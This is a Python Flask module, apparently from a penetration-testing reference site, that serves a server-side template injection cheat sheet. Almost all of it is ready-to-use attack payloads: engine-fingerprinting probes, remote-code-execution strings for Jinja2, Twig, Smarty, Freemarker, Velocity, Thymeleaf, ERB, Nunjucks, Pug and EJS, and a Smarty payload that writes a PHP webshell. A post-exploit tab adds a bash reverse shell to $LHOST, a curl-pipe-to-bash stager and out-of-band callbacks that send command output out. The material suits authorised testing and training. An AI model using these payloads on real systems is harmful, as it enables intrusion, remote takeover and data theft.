"""Server-Side Template Injection (SSTI) cheats, tabbed by language/engine.

Flow: confirm injection with a polyglot math probe, fingerprint the engine from
which probes evaluate, then jump to the engine tab for read/RCE payloads.
"""
from flask import Blueprint, render_template

bp = Blueprint("ssti", __name__)

DETECT = [
    {"title": "Confirm injection", "hint": "If any of these render evaluated (49, not the literal), the input hits a template.", "blocks": [
        {"tpl": "${7*7}", "plain": True, "lbl": "Java / JSP EL, Freemarker, Thymeleaf"},
        {"tpl": "{{7*7}}", "plain": True, "lbl": "Jinja2, Twig, Nunjucks, Handlebars-ish"},
        {"tpl": "{{7*'7'}}", "plain": True, "lbl": "Jinja2 -> 7777777, Twig -> 49 (splits the two)"},
        {"tpl": "<%= 7*7 %>", "plain": True, "lbl": "ERB (Ruby), EJS (Node)"},
        {"tpl": "#{7*7}", "plain": True, "lbl": "Ruby (Slim/Pug interp), Thymeleaf"},
        {"tpl": "*{7*7}", "plain": True, "lbl": "Thymeleaf selection"},
    ]},
    {"title": "Polyglot probe", "hint": "One string that trips most engines at once; look at what evaluates.", "blocks": [
        {"tpl": "${{<%[%'\"}}%\\.", "plain": True, "lbl": "breaks parsers / reveals engine in errors"},
        {"tpl": "{{7*7}}${7*7}<%= 7*7 %>#{7*7}", "plain": True, "lbl": "combined math probe"},
    ]},
    {"title": "Fingerprint decision tree", "hint": "Use the split payloads to tell close engines apart.", "blocks": [
        {"tpl": "{{7*'7'}}  ->  '7777777' = Jinja2/Nunjucks   |   '49' = Twig", "plain": True},
        {"tpl": "${7*7} works but {{7*7}} does not  ->  Freemarker / Velocity / EL", "plain": True},
        {"tpl": "{7*7} (single brace) evaluates  ->  Smarty", "plain": True},
        {"tpl": "a{*comment*}b renders 'ab'  ->  Smarty", "plain": True},
    ]},
    {"title": "Tooling", "blocks": [
        {"tpl": "python3 -m pip install tplmap  # or git clone spgnn/tplmap", "lbl": "install"},
        {"tpl": "tplmap.py -u 'http://$RHOST:$RPORT/page?name=John'"},
        {"tpl": "tplmap.py -u 'http://$RHOST:$RPORT/page' -d 'name=John' --os-shell"},
        {"tpl": "nuclei -u http://$RHOST:$RPORT -tags ssti"},
    ]},
]

PYTHON = [
    {"title": "Jinja2 / Flask — read & recon", "hint": "Confirm with {{7*7}}; config often leaks secrets.", "blocks": [
        {"tpl": "{{ config }}", "plain": True, "lbl": "Flask config (may hold SECRET_KEY)"},
        {"tpl": "{{ config.items() }}", "plain": True},
        {"tpl": "{{ self.__init__.__globals__ }}", "plain": True},
        {"tpl": "{{ request.application.__globals__.__builtins__ }}", "plain": True},
        {"tpl": "{{ ''.__class__.__mro__ }}", "plain": True, "lbl": "walk the class tree"},
    ]},
    {"title": "Jinja2 — RCE (modern, no __mro__ walking)", "hint": "Cleanest paths on current Flask/Jinja.", "blocks": [
        {"tpl": "{{ cycler.__init__.__globals__.os.popen('id').read() }}", "plain": True},
        {"tpl": "{{ lipsum.__globals__.os.popen('id').read() }}", "plain": True},
        {"tpl": "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}", "plain": True},
        {"tpl": "{{ get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read() }}", "plain": True},
        {"tpl": "{{ namespace.__init__.__globals__.os.popen('id').read() }}", "plain": True},
    ]},
    {"title": "Jinja2 — RCE (classic subclasses gadget)", "hint": "Index varies per target; grep the subclasses list for Popen/warnings.", "blocks": [
        {"tpl": "{{ ''.__class__.__mro__[1].__subclasses__() }}", "plain": True, "lbl": "list gadgets, find index"},
        {"tpl": "{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}", "plain": True, "lbl": "subprocess.Popen"},
        {"tpl": "{{ ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['sys'].modules['os'].popen('id').read() }}", "plain": True, "lbl": "via warnings.catch_warnings"},
    ]},
    {"title": "Jinja2 — filter/bracket bypass", "hint": "When {{ }} or dots/quotes are filtered.", "blocks": [
        {"tpl": "{% if ''.__class__ %}...{% endif %}", "plain": True, "lbl": "use {% %} when {{ }} blocked"},
        {"tpl": "{{ ''[request.args.c] }}  &c=__class__", "plain": True, "lbl": "attribute via request args"},
        {"tpl": "{{ ()|attr('__class__')|attr('__base__') }}", "plain": True, "lbl": "attr() instead of dots"},
        {"tpl": "{{ request|attr(['__cl','ass__']|join) }}", "plain": True, "lbl": "split filtered words"},
    ]},
    {"title": "Tornado / Mako / Django", "blocks": [
        {"tpl": "{% import os %}{{ os.popen('id').read() }}", "plain": True, "lbl": "Tornado"},
        {"tpl": "${self.module.cache.util.os.system('id')}", "plain": True, "lbl": "Mako"},
        {"tpl": "${__import__('os').popen('id').read()}", "plain": True, "lbl": "Mako"},
        {"tpl": "{% debug %}", "plain": True, "lbl": "Django templates are sandboxed; leak context/settings instead of RCE"},
    ]},
]

PHP = [
    {"title": "Twig — read & RCE", "hint": "{{7*7}} -> 49 and {{7*'7'}} -> 49 confirms Twig.", "blocks": [
        {"tpl": "{{ _self }}", "plain": True, "lbl": "leak template object"},
        {"tpl": "{{ dump(app) }}", "plain": True, "lbl": "Symfony debug dump"},
        {"tpl": "{{ ['id']|filter('system') }}", "plain": True, "lbl": "Twig >=1.x filter gadget"},
        {"tpl": "{{ ['id']|map('system')|join }}", "plain": True},
        {"tpl": "{{ ['id',0]|sort('system')|join }}", "plain": True},
        {"tpl": "{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}", "plain": True, "lbl": "older Twig"},
    ]},
    {"title": "Smarty — RCE", "hint": "{php} may be disabled; use static calls.", "blocks": [
        {"tpl": "{$smarty.version}", "plain": True, "lbl": "confirm + version"},
        {"tpl": "{php}system('id');{/php}", "plain": True, "lbl": "if PHP tags allowed"},
        {"tpl": "{system('id')}", "plain": True},
        {"tpl": "{Smarty_Internal_Write_File::writeFile('/var/www/html/s.php','<?php system($_GET[0]);?>',self::clearConfig())}", "plain": True, "lbl": "write webshell"},
    ]},
    {"title": "Blade (Laravel) / plates", "blocks": [
        {"tpl": "{{ system('id') }}", "plain": True, "lbl": "Blade if raw user input reaches a compiled view"},
        {"tpl": "@php system('id') @endphp", "plain": True},
    ]},
]

JAVA = [
    {"title": "Freemarker — RCE", "hint": "${7*7} works, {{ }} does not.", "blocks": [
        {"tpl": "${7*7}", "plain": True, "lbl": "confirm"},
        {"tpl": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "plain": True},
        {"tpl": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "plain": True, "lbl": "one-liner"},
        {"tpl": "${product.getClass().getProtectionDomain()...}", "plain": True, "lbl": "when Execute is blocked, pivot via objects in scope"},
    ]},
    {"title": "Velocity — RCE", "blocks": [
        {"tpl": "#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")", "plain": True},
        {"tpl": "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))...", "plain": True, "lbl": "reflection chain"},
    ]},
    {"title": "Thymeleaf — expression injection", "hint": "Spring; needs an expression sink (e.g. fragment name).", "blocks": [
        {"tpl": "${T(java.lang.Runtime).getRuntime().exec('id')}", "plain": True, "lbl": "SpEL"},
        {"tpl": "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x", "plain": True, "lbl": "preprocessing form"},
        {"tpl": "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]", "plain": True},
    ]},
    {"title": "Spring EL / generic SpEL", "blocks": [
        {"tpl": "T(java.lang.Runtime).getRuntime().exec('id')", "plain": True},
        {"tpl": "new java.lang.ProcessBuilder({'/bin/sh','-c','id'}).start()", "plain": True},
    ]},
]

RUBY_NODE = [
    {"title": "ERB / Ruby", "hint": "<%= 7*7 %> -> 49.", "blocks": [
        {"tpl": "<%= 7*7 %>", "plain": True, "lbl": "confirm"},
        {"tpl": "<%= system('id') %>", "plain": True},
        {"tpl": "<%= `id` %>", "plain": True, "lbl": "backticks"},
        {"tpl": "<%= IO.popen('id').read %>", "plain": True},
        {"tpl": "<%= File.open('/etc/passwd').read %>", "plain": True, "lbl": "file read"},
    ]},
    {"title": "Slim / Erubis", "blocks": [
        {"tpl": "#{ system('id') }", "plain": True},
        {"tpl": "#{ `id` }", "plain": True},
    ]},
    {"title": "Node — Nunjucks / Handlebars / Pug / EJS", "hint": "Confirm with {{7*7}} (Nunjucks) or <%= %> (EJS).", "blocks": [
        {"tpl": "{{ range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")() }}", "plain": True, "lbl": "Nunjucks"},
        {"tpl": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1');}}", "plain": True, "lbl": "Handlebars (older) — see full chain in notes"},
        {"tpl": "#{root.process.mainModule.require('child_process').execSync('id')}", "plain": True, "lbl": "Pug"},
        {"tpl": "<%= global.process.mainModule.require('child_process').execSync('id') %>", "plain": True, "lbl": "EJS"},
        {"tpl": "#{function(){localLoad=global.process.mainModule.constructor._load;return localLoad('child_process').execSync('id').toString()}()}", "plain": True, "lbl": "Pug alt"},
    ]},
]

NEXT = [
    {"title": "After RCE — stabilise & escalate", "blocks": [
        {"tpl": "<payload wrapping> bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'", "lbl": "reverse shell in place of id"},
        {"tpl": "<payload> curl http://$LHOST/x.sh|bash", "lbl": "stager if quoting is painful"},
        {"tpl": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", "lbl": "TTY upgrade"},
    ]},
    {"title": "Blind SSTI", "hint": "No output reflected — prove exec out-of-band.", "blocks": [
        {"tpl": "{{ <engine payload> }} -> nslookup $LHOST / curl http://$LHOST/`id`", "plain": True, "lbl": "DNS/HTTP callback"},
        {"tpl": "sleep-based: run 'sleep 10' and diff response time", "plain": True},
    ]},
]

TABS = [
    ("detect", "Detect", DETECT),
    ("python", "Python", PYTHON),
    ("php", "PHP", PHP),
    ("java", "Java", JAVA),
    ("ruby_node", "Ruby / Node", RUBY_NODE),
    ("next", "Post-exploit", NEXT),
]


@bp.route("/ssti")
def index():
    return render_template("tabcheat.html", active="ssti", pkey="ssti",
                           title="SSTI", tag="exploitation",
                           intro="Server-side template injection: confirm with a math probe, "
                                 "fingerprint the engine, then read files or get RCE. "
                                 "Swap id / $LHOST / $LPORT for your own command.",
                           tabs=TABS)


MODULE = {"id": "ssti", "title": "SSTI", "category": "Exploitation",
          "order": 2.5, "blueprint": bp, "endpoint": "ssti.index"}
